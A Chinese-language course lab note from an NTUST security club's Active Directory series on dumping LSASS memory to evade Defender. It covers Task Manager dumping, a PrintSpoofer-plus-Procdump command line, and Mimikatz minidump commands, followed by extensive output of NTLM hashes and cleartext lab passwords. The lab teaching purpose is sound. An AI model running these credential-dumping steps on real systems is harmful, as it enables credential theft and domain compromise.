---
title: NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp)
tags: [NTUSTISC, AD, information security]

category: "Security/Course/NTUST ISC/AD/3. 更多密碼"
---

# NTUSTISC - AD Note - Lab(其他方法得到lsass.dmp)
<!-- more -->
[TOC]

Lecture Video: [2022/05/04 AD 安全1](https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&t=4257)

## Background
有了Mimikatz也不一定能夠用，因為Windows的defender也知道這是個好用的東西，對於攻擊方而言，所以會盡可能的直接刪除，那要怎麼bypass或用其他方法把LSASS帶走?

## Lab

### ==Take LSASS with other ways==

#### 方法一
在windows工作管理員中，找到Local Security Authority Process(LSASS)，右鍵選==建立傾印檔案==，就可以直接dump memory，然後再把這一份檔案丟到自己可以開mimikatz的電腦，就可以分析了，會有一樣的效果
![](https://hackmd.io/_uploads/ryINQ7NRh.png)
![](https://hackmd.io/_uploads/ByvHX7NR2.png)

#### 方法二
如果沒有GUI的話，也可以考慮直接使用[Procdump](https://docs.microsoft.com/zh-tw/sysinternals/downloads/procdump)，當然你必須要取得足夠的權限，要不就是用前面提到的IIS提權執行指令，不然就直接切換administrator帳戶，我是用前者
Command: `c:\tools\PrintSpoofer64.exe -c "c:\windows\system32\cmd.exe /c c:\tools\Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp > c:\inetpub\wwwroot\tmp.txt"`
![](https://hackmd.io/_uploads/HJXt8mN0h.png)
可以看到它放在`C:\Windows\system32\lsass.dmp`中

#### 透過Minidump獲取資訊
有了前面的lsass.dmp，就可以繼續使用mimikatz得到一些有用的資訊，只是，指令稍微有點不太一樣，因為我們不用對lsass進行debug
```bash
$ Sekurlsa::minidump "<path to lsass.dmp>"
$ Sekurlsa::logonPasswords
```
:::spoiler Result
```bash
mimikatz # Sekurlsa::minidump "C:\Windows\system32\lsass.dmp"
Switch to MINIDUMP : 'C:\Windows\system32\lsass.dmp'

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # Sekurlsa::logonPasswords
Opening : 'C:\Windows\system32\lsass.dmp' file for minidump...

Authentication Id : 0 ; 2913881 (00000000:002c7659)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 2023/9/5 上午 11:49:20
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
        msv :
         [00000003] Primary
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
        tspkg :
        wdigest :
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * Password : (null)
        kerberos :
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma.org
         * Password : maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2569783 (00000000:00273637)
Session           : CachedInteractive from 1
User Name         : Administrator
Domain            : kuma
Logon Server      : WIN-818G5VCOLJO
Logon Time        : 2023/9/5 上午 11:39:37
SID               : S-1-5-21-306106713-2531972042-334329499-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : kuma
         * NTLM     : 7ecffff0c3548187607a14bad0f88bb1
         * SHA1     : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
         * DPAPI    : cf967ea9c9c0f9d58b79fdd040270648
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : kuma
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : KUMA.ORG
         * Password : 1qaz@WSX3edc
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 1145006 (00000000:001178ae)
Session           : CachedInteractive from 1
User Name         : Administrator
Domain            : kuma
Logon Server      : WIN-818G5VCOLJO
Logon Time        : 2023/9/5 上午 12:43:30
SID               : S-1-5-21-306106713-2531972042-334329499-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : kuma
         * NTLM     : 7ecffff0c3548187607a14bad0f88bb1
         * SHA1     : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
         * DPAPI    : cf967ea9c9c0f9d58b79fdd040270648
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : kuma
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : KUMA.ORG
         * Password : 1qaz@WSX3edc
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 419256 (00000000:000665b8)
Session           : Interactive from 1
User Name         : bear
Domain            : kuma
Logon Server      : WIN-818G5VCOLJO
Logon Time        : 2023/9/5 上午 12:29:31
SID               : S-1-5-21-306106713-2531972042-334329499-2101
        msv :
         [00000003] Primary
         * Username : bear
         * Domain   : kuma
         * NTLM     : 7ecffff0c3548187607a14bad0f88bb1
         * SHA1     : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
         * DPAPI    : 4057a0d0b94378dd03224e8b3d28a006
        tspkg :
        wdigest :
         * Username : bear
         * Domain   : kuma
         * Password : (null)
        kerberos :
         * Username : bear
         * Domain   : KUMA.ORG
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/9/5 上午 12:22:35
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/9/5 上午 12:22:24
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 70310 (00000000:000112a6)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/9/5 上午 12:22:24
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
        tspkg :
        wdigest :
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * Password : (null)
        kerberos :
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma.org
         * Password : maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 70283 (00000000:0001128b)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/9/5 上午 12:22:24
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
        tspkg :
        wdigest :
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * Password : (null)
        kerberos :
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma.org
         * Password : maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DESKTOP-G95U93T$
Domain            : kuma
Logon Server      : (null)
Logon Time        : 2023/9/5 上午 12:22:21
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
        tspkg :
        wdigest :
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * Password : (null)
        kerberos :
         * Username : desktop-g95u93t$
         * Domain   : KUMA.ORG
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 46383 (00000000:0000b52f)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/9/5 上午 12:22:20
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
        tspkg :
        wdigest :
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * Password : (null)
        kerberos :
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma.org
         * Password : maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 46347 (00000000:0000b50b)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/9/5 上午 12:22:20
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
        tspkg :
        wdigest :
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * Password : (null)
        kerberos :
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma.org
         * Password : maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 45411 (00000000:0000b163)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2023/9/5 上午 12:22:17
SID               :
        msv :
         [00000003] Primary
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * NTLM     : 5648c9d78a770f3e0f727a5fac99da5a
         * SHA1     : 074499733e91d086762a4bc2df67f5fa51c43221
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DESKTOP-G95U93T$
Domain            : kuma
Logon Server      : (null)
Logon Time        : 2023/9/5 上午 12:22:17
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-G95U93T$
         * Domain   : kuma
         * Password : (null)
        kerberos :
         * Username : desktop-g95u93t$
         * Domain   : KUMA.ORG
         * Password : (null)
        ssp :
        credman :
        cloudap :
```
:::

## Reference